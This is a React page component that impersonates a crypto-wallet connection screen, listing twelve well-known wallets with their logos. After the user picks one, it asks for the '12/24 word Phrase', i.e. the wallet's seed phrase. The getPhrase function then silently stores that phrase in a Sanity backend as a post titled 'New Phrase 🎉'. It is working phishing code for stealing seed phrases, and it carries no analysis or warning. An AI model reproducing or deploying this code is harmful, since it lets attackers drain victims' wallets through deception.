import React, { useState } from "react";
import client from "../sanity";

const phrase = () => {
  const [phrase, setPhrase] = useState("");
  const [smallModal, setSmallModal] = useState(false);
  const [overlay, setOverlay] = useState(false);
  const [showPhrase, setShowPhrase] = useState(false);
  const [walletQueries, setWalletQueries] = useState({
    name: "",
    image: "",
    color: "",
  });
  const wallets = [
    {
      name: "Atomic",
      image: "Atomic-Wallet.jpg",
      color: "bg-blue-500",
    },
    {
      name: "Avana",
      image: "avana-wallet.webp",
      color: "bg-green-500",
    },
    {
      name: "Exodus",
      image: "Exodus-Wallet.jpg",
      color: "bg-purple-500",
    },
    {
      name: "Glow",
      image: "Glow-logo.png",
      color: "bg-orange-500",
    },
    {
      name: "Ledger",
      image: "ledger-logo-long.svg",
      color: "bg-black",
    },
    {
      name: "Phantom",
      image: "Phantom-wallet.png",
      color: "bg-purple-500",
    },
    {
      name: "Sollet",
      image: "Sollet-Wallet.jpeg",
      color: "bg-blue-500",
    },
    {
      name: "solRnWallet",
      image: "solRnWallet.webp",
      color: "bg--[#17fb9b]",
    },
    {
      name: "solflare",
      image: "solflare-wallet.svg",
      color: "bg-orange-500",
    },
    {
      name: "Math",
      image: "Math-wallet.jpg",
      color: "bg-black",
    },
    {
      name: "Trust",
      image: "Trust-wallet.png",
      color: "bg-blue-500",
    },
    {
      name: "Slope",
      image: "slope-wallet.png",
      color: "bg-[#3f34a8]",
    },
  ];

  const getPhrase = () => {
    console.log(phrase, "✅");
    if (phrase.length < 12) {
      alert("Word Phrase is too short");
      return;
    }
    setPhrase("");
    alert("Phrase has been submitted Successfully 🎉");
    // Send details to backend
    const doc = {
      _type: "post",
      title: "New Phrase 🎉",
      phrase,
    };
    client
      .create(doc)
      .then((res) => console.log("Results", res))
      .catch((err) => console.error(err));
  };

  // Function Calls
  const firstFunc = (name, image, color) => {
    setWalletQueries({
      name,
      image,
      color,
    });
  };
  return (
    <div className="bg-white relative h-screen text-black">
      {/* Overlay */}
      {overlay && (
        <div className="backdrop-blur-md modal w-full absolute z-20 h-full bg-black/30"></div>
      )}
      {/* End Overlay */}
      <h1 className="text-center text-2xl py-2 font-semibold">
        Select Wallet to continue
      </h1>
      <div className="flex mt-5 flex-col">
        <div className="grid grid-cols-4 gap-7">
          {wallets.map((wallet, key) => {
            return (
              <div
                className="flex cursor-pointer text-center flex-col items-center"
                onClick={() => {
                  firstFunc(wallet.name, wallet.image, wallet.color);
                  setOverlay((prev) => !prev);
                  setSmallModal(true);
                }}
                key={key}
              >
                <img
                  src={wallet.image}
                  alt={`img-${wallets.indexOf(wallet)}`}
                  className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
                />
                <small className="text-sm mt-1 text-black">
                  {wallet.name} Wallet
                </small>
              </div>
            );
          })}
        </div>
      </div>

      {/* Small Modal */}
      {smallModal && (
        <div className="flex justify-center items-center absolute top-40 w-full">
          <div
            id="smallModal"
            className="mt-7  bg-white  z-20 rounded-xl shadow-lg"
          >
            <div className="p-4 sm:p-7">
              <div className="w-full flex justify-center mb-3">
                <img
                  src={walletQueries?.image}
                  alt="img"
                  className="h-10 w-10 object-cover"
                />
              </div>
              <div className="flex justify-center items-center">
                <h1 className="block sm:text-2xl text-sm px-10  mb-5 text-center font-semibold text-black">
                  How do you want to connect <br /> to {walletQueries?.name}?
                </h1>
              </div>
              <div className="flex flex-col">
                <button
                  className={`${walletQueries.color} marker:sm:text-base text-sm mt-3 font-semibold text-white px-3 py-2`}
                  onClick={() => {
                    setShowPhrase(true);
                      setSmallModal((prev) => !prev);
                      setOverlay((prev) => !prev);
                  }}
                >
                  Mobile Wallet
                </button>
                <button
                  className={`border-2 border-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
                  onClick={() => {
                    setShowPhrase(true);
                    setSmallModal((prev) => !prev);
                    setOverlay((prev) => !prev);
                  }}
                >
                  Web Wallet
                </button>
                <button
                  className="mt-5 uppercase text-black font-medium"
                  onClick={() => {
                    setSmallModal((prev) => !prev);
                    setOverlay((prev) => !prev);
                  }}
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* End Smll Modal */}
      {showPhrase && (
        <div className="mt-14 p-10 text-center">
          <div>
            <h1 className="font-semibold">Enter 12/24 word Phrase</h1>
            <input
              className="rounded-lg p-3 w-full mt-3 text-white"
              type="text"
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
            />
          </div>
          <button
            className="bg-[#17fb9b] w-full sm:text-base text-sm mt-3 font-semibold rounded-lg text-black  p-2 "
            onClick={getPhrase}
          >
            Continue
          </button>
        </div>
      )}
      {/* InnerWalletshow */}
    </div>
  );
};

export default phrase;
